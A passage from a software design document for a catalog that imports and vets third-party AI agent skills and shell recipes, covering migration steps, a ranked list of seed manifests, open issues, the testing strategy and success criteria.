- **`src/memory/skills.py`** — keep auto-capture from successful tasks; redirect writes into `katalog_index` with `kind=internal_hint`. Existing rows migrate via one-shot script.
- **`src/app/telegram_bot.py`** — add `/katalog ...` command group + callback handlers for source-candidate + policy-proposal + per-artifact buttons.
- **`workflow_engine` / i2p**: per-step `recipe_lookup: true|false` flag (default true for scaffold/auth/api/deploy/test-setup/migration phases; false for design/architecture/debugging/synthesis). `recipe_hint` field passed to matcher.

### Migration

1. Create all new tables (`katalog_index`, `katalog_usage`, `katalog_sources`, `katalog_owners`, `katalog_disabled_imports`, `katalog_bind_cache`, `katalog_mcp_processes`, `katalog_policy`, `katalog_policy_proposals`, `katalog_source_candidates`, `katalog_demand_signals`)
2. Seed `katalog_policy` with baseline allowlists (shell: npx/git/cookiecutter/npm/pip/uvx; injection_regex set; domain_allowlist starter)
3. Seed `katalog_owners` with `anthropics`, `obra`, `wshobson`, `cookiecutter`, `matlab` (trusted)
4. Seed `katalog_sources` with 5 canonical sources (`github:anthropics/skills@/skills`, `github:obra/superpowers@/skills`, etc.), all `discovery_mode=cron`
5. Seed `katalog_disabled_imports` with known rejects (using-superpowers, using-git-worktrees, mcp-browser-use, joke-APIs)
6. Drop seed manifests into `packages/katalog/seed/manifests/*.yaml` (top-20, hand-authored)
7. Migration script: copy `skills` rows → `katalog_index` (`artifact_type='skill'`, `kind='internal_hint'`, exposure_class='context', tier=T0, source='internal'), embed `description+strategy_summary`
8. First discovery cron run pulls canonical sources, auto-tiers; source-scout cron starts proposing untrusted candidates
9. Old `skills.py` API kept as thin shim until coulson/grading paths fully migrate

## Seed manifest list (v1 ship)

Hand-author in `packages/katalog/seed/manifests/`. Ranked by `usability × value` per recon:

1. `anthropics-pdf` — prompt_skill, T0, rubric+context
2. `anthropics-docx` — prompt_skill, T0
3. `anthropics-xlsx` — prompt_skill, T0
4. `anthropics-pptx` — prompt_skill, T0
5. `anthropics-mcp-builder` — prompt_skill, T0, role_swap-capable
6. `anthropics-skill-creator` — prompt_skill, T0 (self-grow)
7. `anthropics-claude-api` — prompt_skill, T0 (cross-link to caveman plugin)
8. `superpowers-brainstorming` — prompt_skill, T0
9. `superpowers-tdd` — prompt_skill, T0 (wire into coder reflection)
10. `superpowers-systematic-debugging` — prompt_skill, T0 (wire into fixer)
11. `superpowers-writing-plans` — prompt_skill, T0
12. `superpowers-subagent-driven-development` — prompt_skill, T0
13. `superpowers-verification-before-completion` — prompt_skill, T0, rubric-capable
14. `wshobson-backend-architect` — agent_config, T0, role_swap
15. `wshobson-security-auditor` — agent_config, T0, role_swap
16. `wshobson-performance-engineer` — agent_config, T0, role_swap
17. `wshobson-test-automator` — agent_config, T0, role_swap
18. `cc-pypackage` — shell_recipe, T1, mechanizable=true, prebind-capable
19. `cc-django` — shell_recipe, T1, mechanizable=true (post-gen hook audit needed)
20. `cc-data-science` — shell_recipe, T1, mechanizable=true

## Open issues (defer to plan, not blocking design)

- Threshold defaults (θ_preempt, θ_prebind, θ_role, θ_low, θ_min) — start strict, lower based on telemetry
- Multi-file skill vetting UX (anthropics xlsx has helper Python files) — file tree + per-file approve vs all-or-nothing
- Rate limit handling for GitHub API in source adapters (gh CLI vs raw REST; auth required for high volume)
- LLM-assisted prompt-injection vetting beyond regex (v1.1)
- API rate limit tracking — hook into `kuleden_donen_var` provider tracker, or duplicate. v1.1.
- API response shape declaration (OpenAPI ref or sample response in manifest) — v1.1
- Multi-call API procedures (procedure kind extended for API chaining) — v1.1
- Paid-tier API consent UX (per-call cost surface; founder approve threshold) — v1.1
- Bind cache eviction tuning (LRU + manifest-version invalidate; how aggressive). Invalidation trigger: when cached args produce step failure twice in a row, invalidate cache row + refire LLM bind next time.
- MCP idle-timeout default (300s starter; observe before tightening)
- `mechanizable` flag authority — adapter inference (presence of `invocation.steps`) plus vetter override; seed manifests explicit
- Bash-vs-PowerShell normalization for cookiecutter post-gen hooks on Windows
- Demand-signal cooldown windows — start at 7d per source_step_pattern
- Failure isolation: matcher errors → graceful degrade (step proceeds without recipe), logged but never propagates exception
- Recipe drift residual on `tool` exposure — model paraphrasing shell into freehand python. Accepted residual risk; higher classes (preempt/prebind) are antidote when applicable.

## Testing strategy

- **Unit**: each source adapter against fixture HTTP responses; each parser against frozen sample artifacts
- **Unit**: each auto-check against positive/negative fixtures (shell with `chmod`, injection regex hits, etc.)
- **Unit**: tier_classifier — verify `min` semantics across all combinations
- **Unit**: each plugin's `parse_manifest` / `vet_checks` / `expose_to_agent` / `execute` / `bind_args` / `as_rubric` / `as_sys_prompt`
- **Integration**: end-to-end fetch → synthesize → tier → enable → match → expose, with mocked sources for all 6 adapter types
- **Integration**: prebind flow — static-only, cache-hit, LLM-fallback (mocked beckman)
- **Integration**: exposure-class branching — verify each (tier, kind, confidence) tuple routes to the right class
- **Telemetry**: assert `katalog_usage` rows written on each match with correct `exposure_class`
- **Migration**: existing `skills` rows readable via new matcher with byte-identical context-injection output for `exposure_class=context`
- **Recon-driven**: replay sampled artifacts from recon (~120) through synthesis pipeline; verify tier distributions match recon predictions

## Success criteria (v1 ship)

- All 11 tables created + migration runs cleanly
- 20 seed manifests installed and matched against ≥3 i2p missions
- 6 source adapters operational; `github_path` + `public_apis_md` + `cookiecutter_template` fully mechanical (no LLM in steady state)
- Anthropics/skills + obra/superpowers fully imported via discovery cron (47+ artifacts)
- Source-scout proposes ≥3 new sources within first week; Telegram UX functional
- At least one `preempt` end-to-end on a real i2p mission (cookiecutter scaffold)
- At least one `prebind` end-to-end with cache-hit on second mission
- At least one `rubric` end-to-end (anthropics-verification-before-completion against a finish-gate)
- At least one `role_swap` end-to-end (wshobson-backend-architect on a backend-design step)
- Existing internal-hint matching produces byte-identical context-injection output post-migration
- `/katalog stats` shows per-exposure-class A/B (preempt vs prebind vs tool vs context vs rubric vs role_swap success rates) across ≥3 missions
